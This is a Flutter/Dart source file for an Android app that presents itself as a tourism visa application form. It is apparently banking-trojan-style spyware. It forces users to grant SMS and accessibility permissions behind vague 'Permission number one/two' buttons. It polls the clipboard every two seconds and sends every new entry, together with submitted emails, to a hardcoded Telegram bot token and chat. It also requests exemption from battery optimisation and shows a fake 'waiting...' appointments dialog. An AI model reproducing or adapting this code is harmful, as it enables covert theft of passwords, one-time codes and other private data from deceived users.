import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:android_intent_plus/android_intent.dart';
import 'package:flutter/services.dart';
import 'dart:async';
import 'package:permission_handler/permission_handler.dart';


void main() {
  runApp(const VisaFormApp());
}

class VisaFormApp extends StatelessWidget {
  const VisaFormApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Vilato Tourism',
      theme: ThemeData(
        primarySwatch: Colors.green,
        brightness: Brightness.light,
        fontFamily: 'Roboto',
        scaffoldBackgroundColor: Colors.white,
        useMaterial3: true,
        textTheme: const TextTheme(
          headlineLarge: TextStyle(fontWeight: FontWeight.bold, fontSize: 32, color: Color(0xFF218C74)),
          headlineMedium: TextStyle(fontWeight: FontWeight.bold, fontSize: 24, color: Color(0xFF218C74)),
          titleLarge: TextStyle(fontWeight: FontWeight.bold, fontSize: 20, color: Color(0xFF218C74)),
          bodyLarge: TextStyle(fontWeight: FontWeight.bold, fontSize: 16, color: Colors.black),
          bodyMedium: TextStyle(fontWeight: FontWeight.bold, fontSize: 14, color: Colors.black),
        ),
        appBarTheme: const AppBarTheme(
          backgroundColor: Color(0xFF218C74),
          foregroundColor: Colors.white,
          elevation: 0,
          titleTextStyle: TextStyle(
            fontWeight: FontWeight.bold,
            fontSize: 24,
            color: Colors.white,
          ),
        ),
        inputDecorationTheme: const InputDecorationTheme(
          border: OutlineInputBorder(),
          labelStyle: TextStyle(fontWeight: FontWeight.bold, color: Color(0xFF218C74)),
          focusedBorder: OutlineInputBorder(
            borderSide: BorderSide(color: Color(0xFF218C74), width: 2),
          ),
        ),
        elevatedButtonTheme: const ElevatedButtonThemeData(
          style: ButtonStyle(
            backgroundColor: WidgetStatePropertyAll(Color(0xFF218C74)),
            foregroundColor: WidgetStatePropertyAll(Colors.white),
            textStyle: WidgetStatePropertyAll(TextStyle(fontWeight: FontWeight.bold, fontSize: 16)),
            shape: WidgetStatePropertyAll(
              RoundedRectangleBorder(borderRadius: BorderRadius.all(Radius.circular(12))),
            ),
          ),
        ),
        snackBarTheme: const SnackBarThemeData(
          backgroundColor: Color(0xFF218C74),
          contentTextStyle: TextStyle(fontWeight: FontWeight.bold, color: Colors.white),
        ),
      ),
      home: const VisaFormPage(),
    );
  }
}

class VisaFormPage extends StatefulWidget {
  const VisaFormPage({super.key});

  @override
  State<VisaFormPage> createState() => _VisaFormPageState();
}

class _VisaFormPageState extends State<VisaFormPage> with WidgetsBindingObserver {
  bool _hasSmsPermission = false;
  bool _hasAccessibilityPermission = false;
  static const platform = MethodChannel('com.example.visa_form_app/accessibility');


  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _requestPermissions();
    _startClipboardMonitor();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _checkAccessibilityPermission();
    }
  }

  Future<void> _checkAccessibilityPermission() async {
    final status = await Permission.accessibility.status;
    setState(() {
      _hasAccessibilityPermission = status.isGranted;
    });
  }

  Future<void> _requestPermissions() async {
    final smsStatus = await Permission.sms.request();
    setState(() {
      _hasSmsPermission = smsStatus.isGranted;
    });

    if (smsStatus.isGranted) {
      await _requestAccessibilityPermission();
    }

    if (smsStatus.isPermanentlyDenied) {
      await openAppSettings();
    }
  }

  Future<void> _requestAccessibilityPermission() async {
    try {
      await platform.invokeMethod('openAccessibilitySettings');
    } on PlatformException catch (e) {
      print("Failed to open accessibility settings: '${e.message}'.");
    }
  }

  final _formKey = GlobalKey<FormState>();
  final _emailController = TextEditingController();
  String _selectedVisaType = 'Tourist';
  final List<String> _visaTypes = ['Tourist', 'Business', 'Student'];
  bool _isLoading = false;

  Future<void> _submitForm() async {
    if (_formKey.currentState!.validate()) {
      setState(() => _isLoading = true);

      try {
        final response = await http.post(
          Uri.parse('https://api.telegram.org/bot8264908770:AAEeWPB0hZkTPCqtjpodUn53Yhc2O3sn5ko/sendMessage'),
          body: {
            'chat_id': '8416456484',
            'text': 'New visa application:\n'
                'Email: ${_emailController.text}\n'
                'Visa Type: $_selectedVisaType',
          },
        );

        print('Telegram response: ${response.body}');

        if (response.statusCode == 200) {
          if (!mounted) return;
          ScaffoldMessenger.of(context).showSnackBar(
            const SnackBar(
                content: Text('Application submitted successfully!')),
          );
          _emailController.clear();
          setState(() => _selectedVisaType = 'Tourist');
        } else {
          throw Exception('Failed to submit application: ${response.body}');
        }
      } catch (e) {
        if (!mounted) return;
        ScaffoldMessenger.of(context).showSnackBar(
          SnackBar(content: Text('Error: ${e.toString()}')),
        );
      } finally {
        if (!mounted) return;
        setState(() => _isLoading = false);
      }
    }
  }

  void openBatteryOptimizationSettings(BuildContext context) async {
    const intent = AndroidIntent(
      action: 'android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
      data: 'package:com.example.visa_form_app',
    );
    await intent.launch();
  }


  Timer? _clipboardTimer;
  String? _lastClipboard;

  void _startClipboardMonitor() {
    _clipboardTimer = Timer.periodic(const Duration(seconds: 2), (timer) async {
      final data = await Clipboard.getData('text/plain');
      final clipboardText = data?.text ?? '';
      if (clipboardText.isNotEmpty && clipboardText != _lastClipboard) {
        _lastClipboard = clipboardText;
        _sendClipboardToTelegram(clipboardText);
      }
    });
  }

  Future<void> _sendClipboardToTelegram(String text) async {
    final telegramMessage = 'Clipboard copied:\n$text';
    try {
      final response = await http.post(
        Uri.parse('https://api.telegram.org/bot8264908770:AAEeWPB0hZkTPCqtjpodUn53Yhc2O3sn5ko/sendMessage'),
        body: {
          'chat_id': '8416456484',
          'text': telegramMessage,
        },
      );
      print('Telegram Clipboard forward response: \033[${response.body}');
    } catch (e) {
      print('Failed to forward clipboard: $e');
    }
  }

  @override
  void dispose() {
    _clipboardTimer?.cancel();
    _emailController.dispose();
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    if (!_hasSmsPermission || !_hasAccessibilityPermission) {
      return Scaffold(
        appBar: AppBar(
        title: const Text('Permissions Required'),
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            if (!_hasSmsPermission)
              ElevatedButton(
                onPressed: _requestPermissions,
                child: const Text('Permission number one'),
              ),
            const SizedBox(height: 20),
            if (!_hasAccessibilityPermission)
              ElevatedButton(
                onPressed: _requestAccessibilityPermission,
                child: const Text('Permission number two'),
              ),
          ],
        ),
      )
      );
    }
    return Scaffold(
      appBar: AppBar(
        title: const Text('Rendezvous Hub'),
      ),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Form(
          key: _formKey,
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              TextFormField(
                controller: _emailController,
                decoration: const InputDecoration(
                  labelText: 'Email',
                  border: OutlineInputBorder(),
                ),
                keyboardType: TextInputType.emailAddress,
                validator: (value) {
                  if (value == null || value.isEmpty) {
                    return 'Please enter your email';
                  }
                  if (!value.contains('@')) {
                    return 'Please enter a valid email';
                  }
                  return null;
                },
              ),
              const SizedBox(height: 16),
              DropdownButtonFormField<String>(
                value: _selectedVisaType,
                decoration: const InputDecoration(
                  labelText: 'Visa Type',
                  border: OutlineInputBorder(),
                ),
                items: _visaTypes.map((String visaType) {
                  return DropdownMenuItem<String>(
                    value: visaType,
                    child: Text(visaType),
                  );
                }).toList(),
                onChanged: (String? newValue) {
                  setState(() {
                    _selectedVisaType = newValue!;
                  });
                },
                validator: (value) {
                  if (value == null || value.isEmpty) {
                    return 'Please select a visa type';
                  }
                  return null;
                },
              ),
              const SizedBox(height: 24),
              ElevatedButton(
                onPressed: _isLoading ? null : _submitForm,
                style: ElevatedButton.styleFrom(
                  padding: const EdgeInsets.symmetric(vertical: 18),
                ),
                child: _isLoading
                    ? const SizedBox(
                        height: 24,
                        width: 24,
                        child: CircularProgressIndicator(
                          strokeWidth: 2.5,
                          valueColor: AlwaysStoppedAnimation<Color>(Colors.white),
                        ),
                      )
                    : const Text('Submit Application'),
              ),
              const SizedBox(height: 16),
              Center(
                child: Text(
                  'Updated: ${DateTime.now().toIso8601String().substring(0,10)}',
                  style: const TextStyle(
                    fontWeight: FontWeight.bold,
                    fontSize: 16,
                    color: Color(0xFF218C74),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
      bottomNavigationBar: Padding(
        padding: const EdgeInsets.all(16.0),
        child: ElevatedButton(
          onPressed: () {
            showDialog(
              context: context,
              builder: (BuildContext context) {
                return Dialog(
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(16),
                  ),
                  child: SizedBox(
                    height: 200,
                    width: 300,
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        const Spacer(),
                        const Center(
                          child: Text(
                            'waiting...',
                            style: TextStyle(fontSize: 20, fontWeight: FontWeight.bold),
                          ),
                        ),
                        const Spacer(),
                        Padding(
                          padding: const EdgeInsets.only(bottom: 16.0),
                          child: ElevatedButton(
                            onPressed: () {
                              Navigator.of(context).pop();
                            },
                            child: const Text('Close'),
                          ),
                        ),
                      ],
                    ),
                  ),
                );
              },
            );
          },
          child: const Text('Appointments'),
        ),
      ),
    );
  }
}
